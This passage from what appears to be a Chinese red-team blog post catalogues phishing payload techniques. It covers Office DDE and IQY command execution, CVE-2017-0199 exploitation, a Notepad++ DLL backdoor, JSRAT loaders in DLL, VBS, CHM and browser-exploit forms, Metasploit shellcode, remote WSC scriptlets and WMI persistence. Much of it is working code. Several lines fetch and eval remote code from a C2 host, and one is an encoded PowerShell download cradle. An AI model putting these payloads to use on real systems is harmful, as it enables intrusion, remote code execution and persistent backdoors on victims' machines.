class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p>代码分析： sProc为rundll32.exe的路径<br>然后RunStff -&gt; CreateProcessA<br>使用rundll32创建进程，然后使用WriteStuff注入shellcode(myArray)</p><p><strong>PS: 同时也可用Msf 或者 Empire等工具生成Macro后门</strong></p><h3 id="Office-DDE"><a href="#Office-DDE" class="headerlink" title="Office DDE"></a>Office DDE</h3><p>Ctrl + F9 （Command + F9）可开启域<br>填入代码即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k calc.exe&quot; \* MERGEFORMAT</span><br></pre></td></tr></table></figure></p><p><img src="/Phishing Attack - 文件落地.resources/F8346748-1553-4C23-BD4E-063A4EA1150C.png" alt="15e498b5fb55042af504a1f99a898b91"></p><p>联动MSF (web_delivery)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k regsvr32 /s /n /u /i:http://192.168.0.1/A9IcXi.sct scrobj.dll&quot;</span><br></pre></td></tr></table></figure></p><p>这种方式回需要受害者确认打开进程，有一定风险</p><h3 id="Excel-IQY"><a href="#Excel-IQY" class="headerlink" title="Excel IQY"></a>Excel IQY</h3><p>IQY是一个Excel Web查询用到的东西，可以直接吧互联网上的东西打印到表中<br>数据-&gt;倒入数据-&gt;新建Web查询<br><img src="/Phishing Attack - 文件落地.resources/CBC34D2AE7ADB278D040CA16FF6E1DF9.jpg" alt="cbc34d2ae7adb278d040ca16ff6e1df9"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=cmd|&apos;/c calc.exe &apos;!A0</span><br></pre></td></tr></table></figure><p>单引号内调用恶意程序<br><img src="/Phishing Attack - 文件落地.resources/6CA2FC83266D62BB018FA05C8DA71CE1.png" alt="6ca2fc83266d62bb018fa05c8da71ce1"></p><p>同样需要受害者确认打开进程</p><h3 id="OLE"><a href="#OLE" class="headerlink" title="OLE"></a>OLE</h3><p>OLE - 外部对象<br>常见利用场景见CVE-2017-0199</p><h3 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h3><p>UNC(Universal Naming Convention)<br>就是windows共享进行<br>经典用法:<br><a href="https://github.com/0x09AL/WordSteal" target="_blank" rel="noopener">https://github.com/0x09AL/WordSteal</a></p><p>插入UNC路径的图片窃取目标用户NTMLhash</p><h3 id="Powerpoint-Button"><a href="#Powerpoint-Button" class="headerlink" title="Powerpoint Button"></a>Powerpoint Button</h3><p><img src="/Phishing Attack - 文件落地.resources/7E574267-CC0D-4847-B465-4ACB186D797B.png" alt="9524de25b9403cfff1df3282fc5b914c"></p><p><img src="/Phishing Attack - 文件落地.resources/8F4F1F9B-CFC0-4864-9613-3BC0D57E54EE.png" alt="5050e237bcc98ba0dfd904dfe9ffa4f7"></p><p><img src="/Phishing Attack - 文件落地.resources/7FE8F89E-CE1C-4D53-97AC-8859BC8F6951.png" alt="e63764e020d99c4a5aececdf8cd5c887"></p><h3 id="CVE-2017-0199"><a href="#CVE-2017-0199" class="headerlink" title="CVE-2017-0199"></a>CVE-2017-0199</h3><p>利用rtf的特性，可以自启动加载OLE调用的外部组件，通过修改Server的MIME类型，让引用的RTF文档解析为HTA文件，执行命令<br>影响版本：<br><code>Office 2007,Office 2010,Office 2013,Office 2016</code></p><p>注意点：<br>使用Notepad++将生成的rtf文档里的<br><code>\object\objautlink\rsltpict</code>替换为<code>\object\objautlink\objupdate\rsltpict</code></p><p>至于修改File Server的MIME类型:<br>直接在Apache2的主配置中编辑：<br><code>AddType application/rtf .rtf</code></p><h3 id="CVE-2017-8570"><a href="#CVE-2017-8570" class="headerlink" title="CVE-2017-8570"></a>CVE-2017-8570</h3><p>原理：利用RTF文档的Packager.dll搭配%temp%目录，将.sct以Packager对象存入，再用rtf文档去调用他，就可以达到利用.sct调用COM接口来执行命令的效果</p><p><a href="https://github.com/klionsec/PhishingExploit/blob/master/CVE-2017-8570/packager_composite_moniker.py" target="_blank" rel="noopener">https://github.com/klionsec/PhishingExploit/blob/master/CVE-2017-8570/packager_composite_moniker.py</a></p><h2 id="0x01-Notepad-dll后门"><a href="#0x01-Notepad-dll后门" class="headerlink" title="0x01 Notepad++ dll后门"></a>0x01 Notepad++ dll后门</h2><p>就是利用notepad++自带的import plugin功能，调用dll达到命令执行</p><p><img src="/Phishing Attack - 文件落地.resources/5B9031F9-6667-4535-B8DC-C1937D69D7E2.png" alt="400502f6e034cc52cd458c0c2451c407"></p><p><img src="/Phishing Attack - 文件落地.resources/567F801D-BF7D-415B-B71B-8C69B5FC2655.png" alt="3afea44ee05002f146cd03bebbf5141a"></p><p><img src="/Phishing Attack - 文件落地.resources/52DA7410-409A-48B8-A25F-D831E35E4895.png" alt="1877d5f999e0f057f910ad4e17d76273"></p><p>应用场景： 伪造插件进行钓鱼</p><h2 id="0x02-JSRAT"><a href="#0x02-JSRAT" class="headerlink" title="0x02 JSRAT"></a>0x02 JSRAT</h2><p><a href="http://www.anquan.us/static/drops/tips-11764.html" target="_blank" rel="noopener">Javascript Backdoor</a></p><p>核心思路是利用<strong>rundll32.exe</strong>执行javascript代码<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(‘foo’);</span><br></pre></td></tr></table></figure></p><p>所以，为什么可以执行呢？<br><a href="https://wooyun.js.org/drops/JavaScript%E5%90%8E%E9%97%A8%E6%B7%B1%E5%B1%82%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">JavaScript后门深层分析</a></p><p><a href="http://www.anquan.us/static/drops/tips-12386.html" target="_blank" rel="noopener">JavaScript Phishing</a></p><h3 id="利用DLL-加载-JS"><a href="#利用DLL-加载-JS" class="headerlink" title="利用DLL 加载 JS"></a>利用DLL 加载 JS</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HANDLE hModule, </span></span></span><br><span class="line"><span class="function"><span class="params">                      DWORD  ul_reason_for_call, </span></span></span><br><span class="line"><span class="function"><span class="params">                      LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                      )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> *command=<span class="string">"cmd.exe /c start rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new\%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.1.100/connect\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new\%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);&#125;"</span>;           </span><br><span class="line">            WinExec(command,SW_HIDE); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回弹到192.168.1.100的<a href="https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1" target="_blank" rel="noopener">JSRat.ps1</a></p><h3 id="利用-swf-加载-JS"><a href="#利用-swf-加载-JS" class="headerlink" title="利用 swf 加载 JS"></a>利用 swf 加载 JS</h3><p>同样的，利用msf自带 windows/exec模块生成shellcode<br><img src="/Phishing Attack - 文件落地.resources/DF559A52-42EB-46F2-8F0A-93762C6A891A.png" alt="23adc6883f957f15da50e03cd6dfd4a0"></p><p>利用Adobe Flash CS6编译生成swf，配合Adobe Flash Player漏洞即可RCE</p><h3 id="利用-浏览器漏洞-加载-JS"><a href="#利用-浏览器漏洞-加载-JS" class="headerlink" title="利用 浏览器漏洞 加载 JS"></a>利用 浏览器漏洞 加载 JS</h3><p>CVE-2014-6332 等漏洞<br>利用页面执行VB Script<br><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT LANGUAGE=<span class="string">"VBScript"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> runmumaa() </span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">set</span> shell=createobject(<span class="string">"wscript.shell"</span>)</span><br><span class="line">shell.run <span class="string">"rundll32.exe javascript:"</span><span class="string">"\..\mshtml,RunHTMLApplication "</span><span class="string">";document.write();h=new%20ActiveXObject("</span><span class="string">"WinHttp.WinHttpRequest.5.1"</span><span class="string">");h.Open("</span><span class="string">"GET"</span><span class="string">","</span><span class="string">"http://192.168.174.136/connect"</span><span class="string">",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject("</span><span class="string">"WScript.Shell"</span><span class="string">").Run("</span><span class="string">"cmd /c taskkill /f /im rundll32.exe"</span><span class="string">",0,true);&#125;"</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">end</span> <span class="keyword">function</span></span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h3 id="利用-VBS-加载-JS"><a href="#利用-VBS-加载-JS" class="headerlink" title="利用 VBS 加载 JS"></a>利用 VBS 加载 JS</h3><p>利用VBS调用Wscript.shell，运行命令<br><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> shell=<span class="built_in">createobject</span>(<span class="string">"wscript.shell"</span>)</span><br><span class="line">shell.run <span class="string">"rundll32.exe javascript:"</span><span class="string">"\..\mshtml,RunHTMLApplication "</span><span class="string">";document.write();h=new%20ActiveXObject("</span><span class="string">"WinHttp.WinHttpRequest.5.1"</span><span class="string">");h.Open("</span><span class="string">"GET"</span><span class="string">","</span><span class="string">"http://192.168.174.136/connect"</span><span class="string">",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject("</span><span class="string">"WScript.Shell"</span><span class="string">").Run("</span><span class="string">"cmd /c taskkill /f /im rundll32.exe"</span><span class="string">",0,true);&#125;"</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure></p><h3 id="利用-CHM-加载-JS"><a href="#利用-CHM-加载-JS" class="headerlink" title="利用 CHM 加载 JS"></a>利用 CHM 加载 JS</h3><p>利用CHM的后门，加载JS<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Command"</span> <span class="attr">value</span>=<span class="string">"ShortCut"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Button"</span> <span class="attr">value</span>=<span class="string">"Bitmap::shortcut"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Item1"</span> <span class="attr">value</span>=<span class="string">',calc.exe'</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">"Item2"</span> <span class="attr">value</span>=<span class="string">"273,1,1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">x.Click();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>可执行calc.exe<br>替换为对应js代码即可<br>例如：<br>远程DownloadString JSRA 回连C2<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ep bypass -enc PQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAzADoAOAAwADgAMQAvADEALwAnACkAOwAKAA==</span><br></pre></td></tr></table></figure></p><h3 id="生成-Shellcode"><a href="#生成-Shellcode" class="headerlink" title="生成 Shellcode"></a>生成 Shellcode</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">msf5 payload(windows/messagebox) &gt; use windows/<span class="built_in">exec</span></span><br><span class="line"></span><br><span class="line">msf5 payload(windows/<span class="built_in">exec</span>) &gt; <span class="built_in">set</span> CMD rundll32.exe javascript:\<span class="string">"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.174.136/connect\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 payload(windows/exec) &gt; generate -f c</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string"> * windows/exec - 500 bytes</span></span><br><span class="line"><span class="string"> * http://www.metasploit.com</span></span><br><span class="line"><span class="string"> * VERBOSE=false, PrependMigrate=false, EXITFUNC=process,</span></span><br><span class="line"><span class="string"> * CMD=rundll32.exe javascript:"</span>\..\mshtml,RunHTMLApplication</span><br><span class="line"><span class="string">";document.write();h=new%20ActiveXObject("</span>WinHttp.WinHttpRequest.5.1<span class="string">");h.Open("</span>GET<span class="string">","</span>http://192.168.174.136/connect<span class="string">",false);try&#123;h.Send();B=h.ResponseText;eva * l(B);&#125;catch(e)&#123;new%20ActiveXObject("</span>WScript.Shell<span class="string">").Run("</span>cmd</span><br><span class="line"> * /c taskkill /f /im rundll32.exe<span class="string">",0,true);&#125;</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">unsigned char buf[] =</span></span><br><span class="line"><span class="string">"</span>\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x00\x53\xff\xd5\x72\x75\x6e\x64\x6c\x6c\x33\x32\x2e\x65\x78<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x65\x20\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x22\x5c<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x2e\x2e\x5c\x6d\x73\x68\x74\x6d\x6c\x2c\x52\x75\x6e\x48\x54<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x4d\x4c\x41\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x20\x22<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x3b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x28\x29\x3b\x68\x3d\x6e\x65\x77\x25\x32\x30\x41\x63\x74\x69<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x76\x65\x58\x4f\x62\x6a\x65\x63\x74\x28\x22\x57\x69\x6e\x48<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x74\x74\x70\x2e\x57\x69\x6e\x48\x74\x74\x70\x52\x65\x71\x75<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x65\x73\x74\x2e\x35\x2e\x31\x22\x29\x3b\x68\x2e\x4f\x70\x65<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x6e\x28\x22\x47\x45\x54\x22\x2c\x22\x68\x74\x74\x70\x3a\x2f<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x2f\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x37\x34\x2e\x31\x33<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x36\x2f\x63\x6f\x6e\x6e\x65\x63\x74\x22\x2c\x66\x61\x6c\x73<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x65\x29\x3b\x74\x72\x79\x7b\x68\x2e\x53\x65\x6e\x64\x28\x29<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x3b\x42\x3d\x68\x2e\x52\x65\x73\x70\x6f\x6e\x73\x65\x54\x65<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x78\x74\x3b\x65\x76\x61\x6c\x28\x42\x29\x3b\x7d\x63\x61\x74<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x63\x68\x28\x65\x29\x7b\x6e\x65\x77\x25\x32\x30\x41\x63\x74<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x69\x76\x65\x58\x4f\x62\x6a\x65\x63\x74\x28\x22\x57\x53\x63<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x72\x69\x70\x74\x2e\x53\x68\x65\x6c\x6c\x22\x29\x2e\x52\x75<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x6e\x28\x22\x63\x6d\x64\x20\x2f\x63\x20\x74\x61\x73\x6b\x6b<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x69\x6c\x6c\x20\x2f\x66\x20\x2f\x69\x6d\x20\x72\x75\x6e\x64<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x6c\x6c\x33\x32\x2e\x65\x78\x65\x22\x2c\x30\x2c\x74\x72\x75<span class="string">"</span></span><br><span class="line"><span class="string">"</span>\x65\x29\x3b\x7d\x00<span class="string">";</span></span><br></pre></td></tr></table></figure><h2 id="0x03-WSC"><a href="#0x03-WSC" class="headerlink" title="0x03 WSC"></a>0x03 WSC</h2><p>WSC ： Windows Script<br>WSC是微软提供快速创建COM组建的途径<br>之前lcx师傅很火的一篇文章： <a href="http://huaidan.org/archives/2574.html" target="_blank" rel="noopener">利用wsc创建asp后门</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;    </span><br><span class="line"></span><br><span class="line">&lt;package&gt;</span><br><span class="line">&lt;component id=&quot;testCalc&quot;&gt;    </span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); </span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/script&gt;    </span><br><span class="line"></span><br><span class="line">&lt;/component&gt;</span><br><span class="line">&lt;/package&gt;</span><br></pre></td></tr></table></figure><p>JS文件只需调用wsc即可<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(<span class="string">"script:C:\\testwsc\\test.wsc"</span>);</span><br></pre></td></tr></table></figure></p><p>也可进行远程调用<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(<span class="string">"script:https://raw.githubusercontent.com/patrilic/Backdoors/master/Wsc_backdoor/test.wsc"</span>)</span><br></pre></td></tr></table></figure></p><h2 id="0x04-WMI-Backdoor"><a href="#0x04-WMI-Backdoor" class="headerlink" title="0x04 WMI Backdoor"></a>0x04 WMI Backdoor</h2><p><a href="http://www.anquan.us/static/drops/tips-8260.html" target="_blank" rel="noopener">WMI Backdoor - wooyun Drops</a></p><h4 id="powershell-利用"><a href="#powershell-利用" class="headerlink" title="powershell 利用"></a>powershell 利用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不在Client和Server留下任何文件</span><br><span class="line">不改动注册表</span><br><span class="line">仅使用powershell实现</span><br></pre></td></tr></table></figure><p><strong>利用wmi无文件存储payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$StaticClass = New-Object Management.ManagementClass(&apos;root\cimv2&apos;, $null,</span><br><span class="line">$null)</span><br><span class="line">$StaticClass.Name = &apos;Win32_EvilClass&apos;</span><br><span class="line">$StaticClass.Put()</span><br><span class="line">$StaticClass.Properties.Add(&apos;EvilProperty&apos; , &quot;This is payload&quot;)</span><br><span class="line">$StaticClass.Put()</span><br></pre></td></tr></table></figure></p><h4 id="powershell-调用-javascript-backdoor"><a href="#powershell-调用-javascript-backdoor" class="headerlink" title="powershell 调用 javascript_backdoor"></a>powershell 调用 javascript_backdoor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$filterName = &apos;filtP1&apos;</span><br><span class="line">$consumerName = &apos;consP1&apos;</span><br><span class="line">$Command =&quot;GetObject(&quot;&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;&quot;)&quot;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;    </span><br><span class="line"></span><br><span class="line">$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @&#123;Name=$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query&#125; -ErrorAction Stop    </span><br><span class="line"></span><br><span class="line">$WMIEventConsumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @&#123;Name=$consumerName;ScriptingEngine=&apos;JScript&apos;;ScriptText=$Command&#125;    </span><br><span class="line"></span><br><span class="line">Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @&#123;Filter=$WMIEventFilter;Consumer=$WMIEventConsumer&#125;</span><br></pre></td></tr></table></figure><h4 id="mof-调用-javascript-backdoor"><a href="#mof-调用-javascript-backdoor" class="headerlink" title="mof 调用 javascript_backdoor"></a>mof 调用 javascript_backdoor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma namespace(&quot;\\\\.\\root\\subscription&quot;)    </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">    Name  = &quot;filtP1&quot;;</span><br><span class="line">  